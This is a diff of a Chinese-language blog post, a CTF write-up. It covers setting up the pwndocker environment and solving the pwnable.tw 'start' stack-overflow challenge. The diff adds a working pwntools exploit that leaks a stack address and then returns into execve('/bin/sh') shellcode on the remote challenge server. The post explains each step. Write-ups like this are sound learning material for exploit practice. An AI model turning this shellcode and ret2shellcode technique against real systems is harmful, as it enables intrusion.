@@ -29,7 +29,7 @@
     
     <div id="post-toc" class="animated hiddenToc hide">
       <span class="title">Toc</span>
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89"><span class="toc-text">1）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89"><span class="toc-text">2）</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89%E5%89%8D%E8%A8%80"><span class="toc-text">1）前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89pwndocker%E5%90%AF%E5%8A%A8"><span class="toc-text">2）pwndocker启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">3）漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%EF%BC%89%E6%80%BB%E7%BB%93"><span class="toc-text">4）总结</span></a></li></ol>
     </div>
     
     <div id="fixed-menu-wrap">
@@ -166,14 +166,14 @@
       <div>
       </div>
     </div>
-    <html><head></head><body><h3 id="1）">1）<a class="post-anchor" href="#1）"></a></h3><p>​    之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。</p>
-<h3 id="2）">2）<a class="post-anchor" href="#2）"></a></h3><p>​    首先是如何build pwndocker的问题。</p>
-<p>​    如果直接<code>docker pull pwndocker</code>，速度一般会很慢。</p>
-<p>​    这里参考一篇博客的做法：<a target="_blank" rel="noopener" href="https://nocbtm.github.io/2020/02/24/skysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/#%E5%89%8D%E8%A8%80">skysider/pwndocker 正确使用姿势</a>。</p>
-<p>​    <code>docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</code>从阿里云上拉取镜像，使得速度变快。</p>
-<p>​    拉取完之后重命名镜像。<code>docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker</code></p>
-<p>​    然后可以</p>
-<pre><code class="bash">docker run -d \
+    <html><head></head><body><h3 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h3><p>​        之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。</p>
+<h3 id="2）pwndocker启动">2）pwndocker启动<a class="post-anchor" href="#2）pwndocker启动"></a></h3><p>​        首先是如何build pwndocker的问题。</p>
+<p>​        如果直接<code>docker pull pwndocker</code>，速度一般会很慢。</p>
+<p>​        这里参考一篇博客的做法：<a target="_blank" rel="noopener" href="https://nocbtm.github.io/2020/02/24/skysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/#%E5%89%8D%E8%A8%80">skysider/pwndocker 正确使用姿势</a>。</p>
+<p>​        <code>docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</code>从阿里云上拉取镜像，使得速度变快。</p>
+<p>​        拉取完之后重命名镜像。<code>docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker</code></p>
+<p>​        然后可以</p>
+<pre><code class="bash">    docker run -d \
     --rm \
     -h ${ctf_name} \
     --name ${ctf_name} \
@@ -182,40 +182,39 @@
     --cap-add=SYS_PTRACE \
     skysider/pwndocker     
 </code></pre>
-<p>​    运行镜像。</p>
-<p>​    但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用<code> docker run -it skysider/pwndocker /bin/bash</code>是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。    </p>
+<p>​        运行镜像。</p>
+<p>​        但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用<code> docker run -it skysider/pwndocker /bin/bash</code>是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。    </p>
 <p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%885.00.25.png" data-caption="截屏2021-11-03 下午5.00.25" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%885.00.25.png" alt="截屏2021-11-03 下午5.00.25"></a></p>
 <p>​    </p>
 <p>​        我们可以先用<code>docker cp</code>来将题目的文件拷贝至容器中。</p>
 <p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.05.57.png" data-caption="截屏2021-11-03 下午10.05.57" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.05.57.png" alt="截屏2021-11-03 下午10.05.57"></a></p>
 <p>​    </p>
-<p>​    关于<code>docker cp</code>指令这里，因为不太熟悉docker的基础指令，掉到坑中绕了一会儿。</p>
-<p>​    如果我们需要将我们的二进制文件cp到容器中，需要指定容器的pid，但是如果是通过<code>docker run</code>指令并加上参数进入容器内的话，每次执行这个指令，就相当于通过镜像重新创建了一个容器，pid就会变化，所以这样操作肯定行不通。所以我们先创建一个容器，然后copy它的pid，cp文件以后，通过<code>docker start</code>和<code>docker attach</code>来进入容器就行。</p>
+<p>​        关于<code>docker cp</code>指令这里，因为不太熟悉docker的基础指令，掉到坑中绕了一会儿。</p>
+<p>​        如果我们需要将我们的二进制文件cp到容器中，需要指定容器的pid，但是如果是通过<code>docker run</code>指令并加上参数进入容器内的话，每次执行这个指令，就相当于通过镜像重新创建了一个容器，pid就会变化，所以这样操作肯定行不通。所以我们先创建一个容器，然后copy它的pid，cp文件以后，通过<code>docker start</code>和<code>docker attach</code>来进入容器就行。</p>
 <p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png" data-caption="截屏2021-11-03 下午10.14.12" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png" alt="截屏2021-11-03 下午10.14.12"></a></p>
-<p>​    愉快的gdb时间（（</p>
-<p>​    还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。</p>
-<p>​    然后是做题时间。</p>
-<p>​    这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。</p>
+<p>​        愉快的gdb时间（（</p>
+<p>​        还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。</p>
+<p>​        然后是做题时间。</p>
+<p>​        这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。</p>
 <p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png" data-caption="截屏2021-11-03 下午11.01.29" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png" alt="截屏2021-11-03 下午11.01.29"></a></p>
 <p>​    </p>
-<p>​    ps：关于cyclic的原理可以看我的pwntools源码解析系列。</p>
-<p>​    然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。</p>
-<p>​    还是要借助<code>docker run</code>的- v参数，大概就是<code>~/work/pwner:/ctf/work</code></p>
-<p>​    但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？</p>
-<p>​    后来重启一次之后就能立即同步到容器中了。好。</p>
+<p>​        ps：关于cyclic的原理可以看我的pwntools源码解析系列。</p>
+<p>​        然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。</p>
+<p>​        还是要借助<code>docker run</code>的- v参数，大概就是<code>~/work/pwner:/ctf/work</code></p>
+<p>​        但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？</p>
+<p>​        后来重启一次之后就能立即同步到容器中了。好。</p>
 <p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png" data-caption="截屏2021-11-03 下午11.16.05" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png" alt="截屏2021-11-03 下午11.16.05"></a></p>
-<p>​    </p>
-<p>​    有一点离谱。</p>
-<p>​    虽然但是，我超，pwndokcer真的好用。</p>
-<p>​    鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（</p>
-<p>​    所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。</p>
-<p>​    然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。</p>
-<p>​    shellcode就没必要手写了，<code>pwntools.shallcraft</code>直接生成。</p>
+<p>​        有一点离谱。</p>
+<p>​        虽然但是，我超，pwndokcer真的好用。</p>
+<p>​        鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（</p>
+<p>​        所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。</p>
+<p>​        然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。</p>
+<p>​        shellcode就没必要手写了，<code>pwntools.shallcraft</code>直接生成。</p>
 <pre><code class="python">from pwn import*
 
 p = remote('chall.pwnable.tw',10000)
 
-shellcode=b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe33\xb0\x0b\xcd\x80'
+shellcode = asm(shellcraft.sh())
 payload = b'a'*20
 payload += shellcode
 p.send(payload)
@@ -223,12 +222,99 @@ p.send(payload)
 p.interactive()
 </code></pre>
 <p>​    摸了一圈，又EOF力。</p>
+<p>​    换了祖传exp。</p>
+<pre><code class="python">from pwn import*
+
+p = remote("chall.pwnable.tw",10000)
+#p = process("./start")
+
+#shellcode = asm(shellcraft.sh())
+shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+
+buf_addr = 0xffffd284
+
+payload = b'a'*0x14 
+payload += p32(0x8048087)
+p.sendafter("Let's start the CTF:",payload)
+stack_addr = u32(p.recv(4))
+print(hex(stack_addr))
+
+
+payload = b'a'*20
+payload += p32(stack_addr+20)
+payload += shellcode
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%889.49.21.png" data-caption="截屏2021-11-04 上午9.49.21" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%889.49.21.png" alt="截屏2021-11-04 上午9.49.21"></a>    </p>
+<p>​        所以shellcode是没有问题的，问题出在需要溢出两次，一次获得栈地址，一次ret到栈地址执行shellcode。我不能理解。</p>
+<p>​        shellcode覆盖retn，不也是在栈上执行吗，为什么EOF。我猜测是栈空间不够大。虽然但是，不想找wp，喜闻乐见地调试一下吧。</p>
+<p>​        在调试的时候又出现了新问题。</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%8810.01.04.png" data-caption="截屏2021-11-04 上午10.01.04" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%8810.01.04.png" alt="截屏2021-11-04 上午10.01.04"></a>    </p>
+<p>​        搜了一圈应该是启动tmux的问题。但是网上给的解决方案在我这里似乎不管用。</p>
+<p>​        在研究tumx的时候发现了一个更离谱的事，这个pwndocker的系统时间是错误的。导致apt都运行不了。</p>
+<p>​        这就造成了一个非常离谱的死循环，修复时间需要使用apt安装相关的软件，然而时间又导致apt无法运行。</p>
+<p>​        虽然但是，解决方法也比较弱智。把https改成http是最粗暴的解决方案了，但是有一说一，这不优雅。但是最后还是妥协了，先用http下了一个ntp，然而发现就算是系统时间校准了，换回https后还是现实证书不被信任。。。</p>
+<p>​        这里留个疑点吧。</p>
+<p>​        还是回到题目本身。也就是无法<code>gdb.attach()</code>的问题。</p>
+<p>​        原来是因为要先输入tmux进入，才能执行分屏。。。。。。。。</p>
+<p>​        我傻了。坑是真的多。</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%885.30.51.png" data-caption="截屏2021-11-04 下午5.30.51" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%885.30.51.png" alt="截屏2021-11-04 下午5.30.51"></a></p>
+<p>​        果然碰到了无限waiting for debug的问题，虽然pwntools是4.6.1了。</p>
+<p>​        在修改源码后解决问题，详情可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43483799/article/details/118885208?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link">pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案</a>。</p>
+<p>​        解决问题的过程中又发现了一个问题，就是我打开tmux的时候突然就风扇狂转，CPU占用率直接飙到109%，内存3.53G。我以为是容器开太多的问题，把多余的容器全部rm，但是还是不见缓解。</p>
+<p>​        百度后发现这个好像是MAC运行Docker的通病，但是我这个容器至少不应该是这样，因为之前风扇一直就没怎么转，于是我把我现在运行的容器停止，结果cpu占用率一下就变低了，然后再重启，cpu占用率再也没有升高。</p>
+<p>​        对于这个情况我的合理猜测是，那个pwntools源码的无限循环问题。</p>
+<h3 id=""><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png" data-caption="" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png" alt=""></a><a class="post-anchor" href="#"></a></h3><p>​    </p>
 <p>​    </p>
+<p>​        尝试了一下一种新的下断点方式。    </p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.43.49.png" data-caption="截屏2021-11-04 下午7.43.49" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.43.49.png" alt="截屏2021-11-04 下午7.43.49"></a></p>
+<p>​        回到题目，很显然如果摁执行shellcode，就根本没有反应（（</p>
+<p>​        eip也没有被覆盖。之前的猜测是栈空间不够，这里来验证一下。</p>
+<p>​        新问题，如果调试的话terminal中tmux的选项似乎只能指定splitw，但是这样就没有办法滚动。。。</p>
+<p>​        好，解决了。首先可以通过按ctrl+b后再按[，切换到查看另一个窗口的历史输出模式，然后将终端中的偏好设置里的“滚动备用屏幕”取消勾选（其实默认应该是不勾的）</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.42.37.png" data-caption="截屏2021-11-04 下午9.42.37" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.42.37.png" alt="截屏2021-11-04 下午9.42.37"></a></p>
+<p>​        这样我们的操作逻辑就是Fn/shift加鼠标滚轮滚动页面，普通的鼠标滚轮则选择历史输入，然后</p>
+<p>ctrl+b后再按[，可以用鼠标滚轮控制光标查看历史输出。</p>
+<p>​        (真有够麻烦的)</p>
+<h3 id="3）漏洞利用">3）漏洞利用<a class="post-anchor" href="#3）漏洞利用"></a></h3><p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.50.04.png" data-caption="截屏2021-11-04 下午9.50.04" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.50.04.png" alt="截屏2021-11-04 下午9.50.04"></a>        </p>
+<p>​        看一下发现不对头，这个返回地址是我们的shellcode。</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211104215119020.png" data-caption="image-20211104215119020" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211104215119020.png" alt="image-20211104215119020"></a></p>
+<p>​        按照我的想法，指令应该继续执行下去的，因为堆栈可执行。但是实际上并没有执行，而是把shellcode识别成了返回地址。</p>
+<p>​        然后我才意识到一直以来我对栈溢出其实是有一些理解上的错误的，retn这个操作码无论如何是不能够被覆盖的，覆盖的只有后面的操作数。所以这里我们需要让程序先retn到一个合法的地址，然后后面跟着shellcode。</p>
+<p>​        那么我们要retn到哪里呢？</p>
+<p>​        既然堆栈可执行，那就直接跳到栈上好了。所以此刻我们需要一个栈上的地址。</p>
+<p>​        既然需要泄露内存，肯定就需要有类似功能的函数，非常清明地，我们能够利用<code>sys_write</code></p>
+<p>对栈上内存进行一个读取。</p>
+<p>​        那么如何利用捏。</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.00.26.png" data-caption="截屏2021-11-04 下午10.00.26" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.00.26.png" alt="截屏2021-11-04 下午10.00.26"></a>            </p>
+<p>​        从这里我们可以清楚地看到，这几条指令分别设置了<code>sys_write</code>的参数，真正的参数实际上是字符串“lets start the ctf”，但是我们这里只需要这四条指令。</p>
+<p>​        <code> mov  ecx, esp</code>将当前栈顶的值赋给ecx，作为函数输出的东西的参数。其他的参数这里我们不必关心。</p>
+<p>​        </p>
+<p>![截屏2021-11-04 下午10.13.28](/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.13.28.png)        </p>
+<p>​        其实从第一个执行流的ret开始前，清栈已经完成，此时栈顶是下一条需要执行的指令的地址，后面就都是栈上的一些环境变量。</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.11.55.png" data-caption="截屏2021-11-04 下午10.11.55" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.11.55.png" alt="截屏2021-11-04 下午10.11.55"></a></p>
+<p>​        当我们的程序执行流回到0x8048087。被write出来的其实就是栈顶的地址。</p>
+<p>​        这时候程序还是会按照原有的指令执行，比如说下一个<code>sys_read</code>函数。</p>
+<p>​        这时候并没有任何栈指针的操作，以至于esp的值很久没有变过。但是这里没有必要在意，直接第二次栈溢出。这里我们retn的地方就是刚刚获得的栈地址。但是因为我们已经输入了0x20个字符，所以需要stack_addr+20。（从动调中我们能够看出，<code>sys_read</code>会对栈指针进行操作，也就是把输入的每一个A压栈，这样我们原先的地址需要+20）</p>
+<p>​        然后直接溢出到栈地址。</p>
+<p>​        执行shellcode</p>
+<p>![截屏2021-11-04 下午10.23.18](/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.23.43.png)</p>
+<p>​            hhx</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.24.07.png" data-caption="截屏2021-11-04 下午10.24.07" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.24.07.png" alt="截屏2021-11-04 下午10.24.07"></a></p>
+<h3 id="4）总结">4）总结<a class="post-anchor" href="#4）总结"></a></h3><p>​        这道题以前做过。但是那个时候我还是个啥也不懂只会抄wp的傻子。那个时候基本问啥啥不懂，现在已经能完全通过exp将不理解的地方通过动调明确了。</p>
+<p>​        动调真的只用了不到半个小时，今天有五分之四的时间都在调教pwndocker的环境。用pwndocker来做真的非常优雅而且方便，我以后真的要舍弃pd力！！！！</p>
+<p>​        另外容器要记得及时备份55.</p>
+<p>​        还有就是经常出现挂载文件夹不同步的问题，这个应该是docker本身存在一些bug，重启以后基本能够解决。</p>
+<p>​        </p>
 </body></html>
 
   
   <div class="post-guide">
     <div class="item left">
+        
+          <a href="../../07/srop%E5%AD%A6%E4%B9%A0/">SROP学习</a>
         
     </div>
     <div class="item right">
